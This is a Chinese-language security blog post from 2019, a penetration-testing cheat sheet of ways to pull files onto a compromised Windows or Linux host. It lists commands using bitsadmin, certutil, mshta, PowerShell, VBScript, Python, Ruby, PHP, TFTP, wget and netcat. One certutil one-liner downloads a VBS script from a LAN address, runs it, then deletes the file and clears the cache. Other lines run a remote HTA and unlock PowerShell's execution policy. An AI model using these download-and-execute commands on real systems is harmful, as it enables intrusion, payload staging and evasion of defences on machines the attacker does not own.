---
layout: post
title: "多种下载文件姿势（长期更新）"
subtitle: "高强度渗透环境下的文件下载姿势"
date: 2019-08-03
author: otto.known
category: security
finished: true
---

[TOC]

#### 高强度渗透环境下的文件下载姿势，很鸡肋的就没贴上来


>Bitsadmin

```php
* bitsadmin /rawreturn /transfer getfile http://download.sysinternals.com/files/PSTools.zip c:\p.zip

* bitsadmin /rawreturn /transfer getpayload http://download.sysinternals.com/files/PSTools.zip c:\p.zip

* bitsadmin /transfer myDownLoadJob /download /priority normal "http://download.sysinternals.com/files/PSTools.zip" "c:\p.zip"
```
>certutil

```php
certutil -urlcache -split -f http://192.168.254.102:80/a.txt b.txt
```

>命令行远程执行VBS

```python
certutil -urlcache -split -f http://192.168.254.102:80/abc a.vbs && cscript a.vbs &&  del a.vbs && certutil -urlcache -split -f http://192.168.254.102:80/abc delete
```

>命令行远程执行HTA

```
mshta http://192.168.254.102/1.hta
```

>Powershell（win2003、winXP不支持）

```powershell
$p = New-Object System.Net.WebClient 
$p.DownloadFile("http://domain/file","C:%homepath%file")
```

执行
```powershell
PS C:> .test.ps1
```

如果Powershell禁止执行了，使用如下命令：

```powershell
C:>powershell set-executionpolicy unrestricted
```

>Visual Basic

创建如下脚本
```vb
Set args = Wscript.Arguments
Url = "http://domain/file"
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", Url, False
xHttp.Send
with bStrm
    .type = 1 '
    .open
    .write xHttp.responseBody
    .savetofile " C:\%homepath%\file", 2 '
end with
```

执行
```powershell
C:>cscript test.vbs
```

>Python

```python
#!/usr/bin/python 
import urllib2 
u = urllib2.urlopen('http://domain/file') 
localFile = open('local_file', 'w') 
localFile.write(u.read()) 
localFile.close()
```

执行
```shell
root@kali:~# python test.py
```

>Ruby

```ruby
#!/usr/bin/ruby
require 'net/http'
Net::HTTP.start("www.domain.com") { |http|
r = http.get("/file")
open("save_location", "wb") { |file|
file.write(r.body)
}
}
```

执行
```shell
root@kali:~# ruby test.rb
```

>PHP

```php
#!/usr/bin/php 
<?php $data = @file("http://example.com/file");
$lf = "local_file";         
$fh = fopen($lf, 'w');         
fwrite($fh, $data[0]);         
fclose($fh); 
?>
```

执行
```shell
root@kali:~# php test.php
```

>FTP

````shell
ftp 127.0.0.1 username password get filename exit
```

>TFTP

```shell
tftp -i host GET C:%homepath%file location_of_file_on_tftp_server
```

>Wget

```shell
wget http://example.com/file
```

>Netcat

attacker执行

```shell
cat file | nc -l 1234
```
target执行

```shell
nc host_ip 1234 > file
```



